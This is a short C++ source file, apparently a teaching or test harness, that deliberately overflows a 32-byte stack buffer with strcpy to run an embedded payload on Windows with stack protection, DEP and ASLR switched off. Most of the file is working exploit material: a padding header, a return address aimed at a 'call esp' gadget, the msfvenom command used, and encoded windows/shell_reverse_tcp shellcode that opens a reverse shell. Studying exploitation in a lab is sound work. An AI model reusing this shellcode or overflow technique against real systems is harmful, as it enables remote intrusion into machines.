// bov.cpp : Simple App to test vanilla buffer overflow payloads
// Required compilation options (MS Visual Studio Community 2019):
// Disable Security Check /GS-
// Data Execution Prevention (DEP): NO /NXCOMPAT:NO
// Randomized Base Address: NO /DYNAMICBASE:NO
// Base Address: 0x40400000
// During execution it may also be neccessary to Ignore warnings
// using button Ignore.

// Author: Marcin Wolak
// https://www.linkedin.com/in/marcinwolak/
// https://marcin-wolak.medium.com/

#include <iostream>

char pld[] = 

//Header
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x42\x42\x42\x42\x43\x43\x43\x43"

//Return address overwritten with call esp, see jumps() below
"\x49\x18\x41\x40"

// Payload
//msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00"
"\xba\xae\x70\xac\xfc"			// mov edx,0xfcac70ae - First payload instruction
"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff"  // Pushing address of the next instruction (fincstp) on stack
"\xd9\xf7"             			// fincstp - First f* instruction
"\x90\x90\x90\x90"     			// fnstenv [esp-0xC] replaced in shikata_ga_nai.rb by four NOPs
"\x5e\x29\xc9"         			// Start of the rest of the payload
"\xb1\x52\x31\x56\x12\x03\x56\x12\x83\x40\x8c\x4e\x09\x60"
"\x85\x0d\xf2\x98\x56\x72\x7a\x7d\x67\xb2\x18\xf6\xd8\x02"
"\x6a\x5a\xd5\xe9\x3e\x4e\x6e\x9f\x96\x61\xc7\x2a\xc1\x4c"
"\xd8\x07\x31\xcf\x5a\x5a\x66\x2f\x62\x95\x7b\x2e\xa3\xc8"
"\x76\x62\x7c\x86\x25\x92\x09\xd2\xf5\x19\x41\xf2\x7d\xfe"
"\x12\xf5\xac\x51\x28\xac\x6e\x50\xfd\xc4\x26\x4a\xe2\xe1"
"\xf1\xe1\xd0\x9e\x03\x23\x29\x5e\xaf\x0a\x85\xad\xb1\x4b"
"\x22\x4e\xc4\xa5\x50\xf3\xdf\x72\x2a\x2f\x55\x60\x8c\xa4"
"\xcd\x4c\x2c\x68\x8b\x07\x22\xc5\xdf\x4f\x27\xd8\x0c\xe4"
"\x53\x51\xb3\x2a\xd2\x21\x90\xee\xbe\xf2\xb9\xb7\x1a\x54"
"\xc5\xa7\xc4\x09\x63\xac\xe9\x5e\x1e\xef\x65\x92\x13\x0f"
"\x76\xbc\x24\x7c\x44\x63\x9f\xea\xe4\xec\x39\xed\x0b\xc7"
"\xfe\x61\xf2\xe8\xfe\xa8\x31\xbc\xae\xc2\x90\xbd\x24\x12"
"\x1c\x68\xea\x42\xb2\xc3\x4b\x32\x72\xb4\x23\x58\x7d\xeb"
"\x54\x63\x57\x84\xff\x9e\x30\xd4\xff\xa0\xc1\x42\x02\xa0"
"\xc0\x29\x8b\x46\xa8\x5d\xda\xd1\x45\xc7\x47\xa9\xf4\x08"
"\x52\xd4\x37\x82\x51\x29\xf9\x63\x1f\x39\x6e\x84\x6a\x63"
"\x39\x9b\x40\x0b\xa5\x0e\x0f\xcb\xa0\x32\x98\x9c\xe5\x85"
"\xd1\x48\x18\xbf\x4b\x6e\xe1\x59\xb3\x2a\x3e\x9a\x3a\xb3"
"\xb3\xa6\x18\xa3\x0d\x26\x25\x97\xc1\x71\xf3\x41\xa4\x2b"
"\xb5\x3b\x7e\x87\x1f\xab\x07\xeb\x9f\xad\x07\x26\x56\x51"
"\xb9\x9f\x2f\x6e\x76\x48\xb8\x17\x6a\xe8\x47\xc2\x2e\x08"
"\xaa\xc6\x5a\xa1\x73\x83\xe6\xac\x83\x7e\x24\xc9\x07\x8a"
"\xd5\x2e\x17\xff\xd0\x6b\x9f\xec\xa8\xe4\x4a\x12\x1e\x04"
"\x5f";


int jumps()
{
    __asm
    {
        jmp esp; jump to the payload at 0x40411847
        call esp; call payload at 0x40411849
    }
    return 1;
}

int mycpy()
{
    char buf[32];
    strcpy(buf, pld);
    printf("%s\n", buf);
    return 1;
}

int main(int argc, char** argv)
{
    return mycpy();
}
